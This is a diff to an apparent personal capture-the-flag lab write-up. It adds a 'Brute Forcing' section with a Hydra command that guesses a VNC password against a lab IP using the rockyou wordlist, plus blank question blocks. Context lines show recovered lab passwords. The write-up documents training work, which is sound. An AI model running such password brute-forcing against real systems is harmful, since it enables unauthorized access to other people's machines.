@@ -162,4 +162,20 @@ password::S@nta2022
 ```
 	santa25 (found in file userfiles in smb)
 ```
-5.
+
+**Brute Forcing**
+
+vnc does not use username -f
+``` 
+ hydra -P /usr/share/wordlists/rockyou.txt vnc://10.10.121.156 -V -f -I
+```
+
+1. Use Hydra to find the VNC password of the target with IP address MACHINE_IP. What is the password?
+```
+	
+```
+
+2. Using a VNC client on the AttackBox, connect to the target of IP address MACHINE_IP. What is the flag written on the target’s screen?
+```
+
+```
